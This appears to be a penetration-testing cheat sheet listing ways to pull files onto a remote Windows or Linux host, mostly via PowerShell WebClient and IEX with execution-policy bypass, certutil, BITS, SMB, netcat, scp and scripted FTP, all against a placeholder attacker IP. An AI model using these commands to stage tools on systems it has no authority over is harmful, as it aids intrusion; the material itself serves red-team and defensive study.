USING POWERSHELL -
------------------------------------------------------------------------------------------------------------------ 

**Web Content Download**
    
    $webClient.DownloadFile('http://{LOCAL-IP}:80/demo.txt','\users\public\demo.txt')

**Web Content Download**
    
    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://{LOCAL-IP}/demo.txt','\users\public\demo.txt')

**Web Content Download**
    
    powershell.exe IEX(New-Object System.Net.WebClient).downloadFile('http://{LOCAL-IP}:80/demo.txt','\users\public\demo.txt')

**Web Content Download**
    
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://{LOCAL-IP}/demo.txt','\users\public\demo.txt')"

**Web Content Download**
    
    powershell.exe Invoke-RestMethod -Uri "http://{LOCAL-IP}/demo.txt" -OutFile "\users\public\demo.txt"

**Web Content Download**
    
    powershell.exe Invoke-webRequest -Uri "http://{LOCAL-IP}/demo.txt" -OutFile "\users\public\demo.txt"

**Powershell Wget**
    
    powershell.exe -c wget "http://{LOCAL-IP}/demo.txt" -outfile "\users\public\demo.txt"

**Powershell Curl**
    
    powershell.exe -c "curl.exe http://{LOCAL-IP}:80/demo.txt \users\public\demo.txt"

**Powershell IEX**

    echo IEX(New-Object System.Net.WebClient).downloadFile('http://{LOCAL-IP}:80/demo.txt','\users\public\demo.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
   
**Powershell Direct URI**
    
    iwr -uri http://{LOCAL-IP}/demo.txt -Outfile demo.txt

**Powershell BitsTransfer**

    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination '\users\public\demo.txt'"

**Using file**
    
    echo '$storageDir = $pwd' > wget.ps1
    echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
    echo '$url = "http://{LOCAL-IP}/demo.txt"' >> wget.ps1
    echo '$file = "\users\public\demo.txt"' >> wget.ps1
    echo '$webclient.DownloadFile($url, $file)' >> wget.ps1

    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
------------------------------------------------------------------------------------------------------------------

</br>

USING CMD - 
------------------------------------------------------------------------------------------------------------------

**Web Content Download**
    
    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10{LOCAL-IP}/demo.txt','\users\public\demo.txt')

**Web Content Download**

    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination '\users\public\demo.txt'"

**Web Content Download**
    
    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('http://{LOCAL-IP}:80/demo.txt','\users\public\demo.txt')"

**Web Content Download**
    
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://{LOCAL-IP}/demo.txt','\users\public\demo.txt')"

------------------------------------------------------------------------------------------------------------------

</br>

USING CERTUTIL - 
------------------------------------------------------------------------------------------------------------------

**Web Content Download**
    
    certutil.exe -urlcache -split -f "http://{LOCAL-IP}/demo.txt" demo.txt

**encode content to base64**

    certutil.exe -encode c:demo.txt out.b64 & more .\out.b64

decode with this command or use online base64 decoder

    echo "base64_value==" | base64 -d > demo.txt

------------------------------------------------------------------------------------------------------------------

</br>

USING SMB - 
------------------------------------------------------------------------------------------------------------------

**SMB SERVER -**

**Start normal SMB Server**
    
    impacket-smbserver share .

**If version error**
    
    impacket-smbserver -smb2support share .

**Use authenticated servers if file transfer is long**

    impacket-smbserver share -username user -password pass . -smb2support


**SMB CLIENT -**

**To create authenticated session**
    
    net use \\{LOCAL-IP} /u:"user" "pass"

**Web Content Download**
    
    copy \\{LOCAL-IP}\share\demo.txt \users\public\demo.txt  
------------------------------------------------------------------------------------------------------------------

</br>

USING SSH - 
------------------------------------------------------------------------------------------------------------------

**SCP-**

**Copy a file from Local PC to Remote PC**
    
    scp /tmp/demo.txt user@{REMOTE-IP}:/users/public/

**Copy a directory from Local PC to Remote PC**

    scp -r /tmp/demo/ user@{REMOTE-IP}:/users/public/
    
**Copy a directory from Local to Remote with RSA key**

    scp -i id_rsa -r /tmp/demo/ user@{REMOTE-IP}:/users/public/

**RSYNC-**

**Copy a file from Local PC to Remote PC**
    
    rsync -av /tmp/demo.txt user@{REMOTE-IP}:/users/public/

**Copy a directory from Local PC to Remote PC**

    rsync -r /tmp/demo/ user@{REMOTE-IP}:/users/public/

**Copy a directory from Local to Remote with RSA key**

    rsync -av --port 22 -e 'ssh -i id_rsa' -r /tmp/demo/ user@{REMOTE-IP}:/users/public/
------------------------------------------------------------------------------------------------------------------

</br>

USING WinRM - 
------------------------------------------------------------------------------------------------------------------

**Web Content Download**
    
    upload demo.txt
------------------------------------------------------------------------------------------------------------------

</br>

USING BITSADMIN - 
------------------------------------------------------------------------------------------------------------------

**Download a single file from Local PC to Remote PC**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination '\users\public\demo.txt' -TransferType Download"
    
**Download a multiple files from Local PC to Remote PC**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo1.txt', 'http://{LOCAL-IP}/demo2.txt' -Destination 'c:\users\public\demo1.txt', 'c:\users\public\demo2.txt' -TransferType Download"

**Transfer multiple files from one directory to another directory**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source '\users\public\*.txt' -Destination '\users\public\' -TransferType Download"
------------------------------------------------------------------------------------------------------------------

</br>

USING NC / NETCAT - 
------------------------------------------------------------------------------------------------------------------

**Run NC Server on local PC**
    
    nc.exe -nlvp 443 < demo.txt
                OR
    cat demo.txt | nc -nlvp 443

**Run NC CLient on remote PC**
    
    nc.exe -v {LOCAL-IP} 443 > demo.txt
------------------------------------------------------------------------------------------------------------------

</br>

USING FTP - 
------------------------------------------------------------------------------------------------------------------

**FTP Anonymous**

Replace "demo.txt" with desired file name
    
    echo open {LOCAL-IP} 21 > file.txt
    echo bin>> file.txt
    echo get demo.txt>> file.txt
    echo bye>> file.txt

    ftp -A -v -n -s:file.txt

**One Liner**

    echo open {LOCAL-IP} 21 > file.txt && echo bin>> file.txt && echo get demo.txt>> file.txt && echo bye>> file.txt && ftp -A -v -n -s:file.txt

**Mannualy**

    ftp
    open {LOCAL-IP} 2121
    get demo.txt

**FTP Authenticated**

Replace "demo.txt" with desired file name
    
    echo open {LOCAL-IP} 21 > file.txt
    echo user test>> file.txt
    echo test>> file.txt
    echo bin>> file.txt
    echo get demo.txt>> file.txt
    echo bye>> file.txt

    ftp -v -n -s:file.txt

**Mannualy**

    ftp
    open {LOCAL-IP} 2121
    get demo.txt
------------------------------------------------------------------------------------------------------------------
